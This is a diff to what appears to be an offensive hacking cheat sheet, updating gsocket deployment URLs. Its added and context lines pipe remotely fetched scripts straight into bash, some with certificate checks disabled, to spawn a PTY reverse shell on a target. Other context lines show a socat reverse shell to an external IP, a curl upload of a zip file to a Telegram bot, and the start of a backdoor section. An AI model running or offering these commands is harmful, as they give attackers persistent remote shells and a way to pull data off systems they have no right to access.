@@ -1282,13 +1282,13 @@ curl -sF document=@file.zip "https://api.telegram.org/bot<TG-BOT-TOKEN>/sendDocu
 Use [gsocket deploy](https://gsocket.io/deploy). It spawns a fully functioning PTY reverse shell. Both, the YOU and the remote system, can be behind NAT and the traffic is routed via a relay network. It also supports file upload/download (Ctrl-e c) and alarms when the admin logs in. If netcat is a swiss army knife than gs-netcat is a german battle axe :>
 
 ```sh
-X=ExampleSecretChangeMe bash -c "$(curl -fsSL https://gsocket.io/x)"
-# or X=ExampleSecretChangeMe bash -c "$(wget --no-verbose -O- https://gsocket.io/x)"
+X=ExampleSecretChangeMe bash -c "$(curl -fsSL https://gsocket.io/y)"
+# or X=ExampleSecretChangeMe bash -c "$(wget --no-verbose -O- https://gsocket.io/y)"
 ```
 
 To connect to the shell from your workstation:
 ```sh
-S=ExampleSecretChangeMe bash -c "$(curl -fsSL https://gsocket.io/x)"
+S=ExampleSecretChangeMe bash -c "$(curl -fsSL https://gsocket.io/y)"
 # or gs-netcat -s ExampleSecretChangeMe -i
 # Add -T to tunnel through TOR
 ```
@@ -1508,16 +1508,16 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:3.13.3.7:1524
 
 Mostly we use gs-netcat's automated deployment script: [https://www.gsocket.io/deploy](https://www.gsocket.io/deploy).
 ```sh
-bash -c "$(curl -fsSLk https://gsocket.io/x)"
+bash -c "$(curl -fsSLk https://gsocket.io/y)"
 ```
 or
 ```sh
-bash -c "$(wget --no-check-certificate -qO- https://gsocket.io/x)"
+bash -c "$(wget --no-check-certificate -qO- https://gsocket.io/y)"
 ```
 
 or deploy gsocket by running your own deployment server:
 ```sh
-LOG=results.log bash -c "$(curl -fsSL https://gsocket.io/xs)"  # Notice '/xs' instead of '/x'
+LOG=results.log bash -c "$(curl -fsSL https://gsocket.io/ys)"  # Notice '/ys' instead of '/y'
 ```
 
 <a id="backdoor-background-reverse-shell"></a>
